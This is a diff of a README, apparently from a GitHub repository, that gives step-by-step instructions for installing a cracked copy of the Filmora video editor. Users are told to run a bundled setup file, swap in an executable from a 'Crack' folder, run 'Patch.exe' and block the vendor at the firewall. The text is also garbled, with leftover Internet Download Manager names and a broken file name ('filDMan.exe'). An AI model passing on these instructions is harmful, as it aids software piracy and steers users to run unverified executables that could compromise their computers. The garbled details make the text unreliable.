@@ -35,7 +35,7 @@ Follow these steps to install the cracked version of Filmora :
 
 ### 1. Uninstall any previous version of Filmora :
 - Go to `Control Panel` > `Programs and Features`.
-- Find `Internet Download Manager` and uninstall it.
+- Find `Wondershare-Filmora` and uninstall it.
 ### 2. Download the cracked version:
 - Download This Repo
 - Extract the contents if you downloaded the ZIP file.
@@ -43,7 +43,7 @@ Follow these steps to install the cracked version of Filmora :
 - Run the `Filmora Setup.exe` file found in the downloaded repository.
 - Follow the installation instructions.
 ### 4. Apply the crack:
-- Replace the `Filmora Man.exe` file in the installation directory (usually `C:\Program Files (x86)\Filmora `) with the `IDMan.exe` file provided in the Crack folder of this repository.
+- Replace the `Filmora Man.exe` file in the installation directory (usually `C:\Program Files (x86)\Filmora `) with the filDMan.exe` file provided in the Crack folder of this repository.
 - Run the Patch.exe file from the Crack folder.
 
 ## Usage
@@ -58,7 +58,7 @@ Follow these steps to install the cracked version of Filmora :
 If you encounter any issues, try the following solutions:
 - Ensure you have uninstalled any previous versions of Filmora  before installing the cracked version.
 - Make sure you have replaced the Filmora Man.exe file correctly.
-- Check your firewall settings to ensure IDM is blocked from accessing the internet.
+- Check your firewall settings to ensure Wondershare-Filmora is blocked from accessing the internet.
 
 ## Contributing
 Contributions to improve this project are welcome. Please create a pull request with a detailed description of your changes.
@@ -66,4 +66,4 @@ Contributions to improve this project are welcome. Please create a pull request 
 ## ABout Filmora
 
 
-![download (10)](https://github.com/user-attachments/assets/729cc119-9eca-42ca-8169-349aac63ff99)
+### ![download (10)](https://github.com/user-attachments/assets/729cc119-9eca-42ca-8169-349aac63ff99)
